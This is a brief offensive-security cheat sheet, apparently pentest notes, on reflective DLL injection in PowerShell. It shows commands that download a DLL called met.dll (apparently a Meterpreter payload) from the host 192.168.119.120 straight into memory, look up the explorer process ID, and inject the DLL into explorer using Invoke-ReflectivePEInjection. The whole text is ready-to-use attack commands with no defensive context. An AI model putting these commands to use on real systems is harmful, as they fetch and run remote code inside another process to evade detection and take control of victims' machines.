## Reflective DLL Injection in PowerShell

#### Load the DLL into a byte array and retrieve the explorer process ID:

```
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')

$procid = (Get-Process -Name explorer).Id
```


#### Use Invoke-ReflectivePEInjection

```
PS > Import-Module Invoke-ReflectivePEInjection.ps1

PS > Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```
